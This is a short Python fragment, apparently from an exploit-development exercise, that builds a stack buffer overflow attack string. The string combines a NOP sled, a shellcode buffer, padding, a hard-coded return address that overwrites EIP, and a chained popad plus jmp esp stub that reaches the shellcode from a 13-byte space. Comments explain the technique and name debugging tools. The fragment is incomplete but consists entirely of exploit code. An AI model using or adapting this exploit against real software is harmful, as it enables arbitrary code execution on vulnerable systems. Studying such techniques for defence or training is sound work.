...
def write_exploit():
    ...
    # simulating only 13 bytes of shellcode available to give instructions to
    # use popad to increment esp by 32 bytes per instance
    # 9 * 32 = 288 bytes, effectively jumps 288 bytes into NOPslide
    random_offset = 150
    shellcode_space = 13
    # use mona.py, windbg, or RTA to discover opcode for popad
    # chain 9 popads together followed by jmp esp to execute
    jumpcode = ("\x61"*9)+"\xff\xe4"
    eip = "\x3a\xf2\xaa\x01"
    #eip = "BBBB"
    pad = "XXXX"

    attack_string = prenops + buf + ("A" * (ret - len(prenops) - len(buf))) + eip + pad + jumpcode + ("\x90" * (shellcode_space - len(jumpcode))) + ("D" * random_offset)
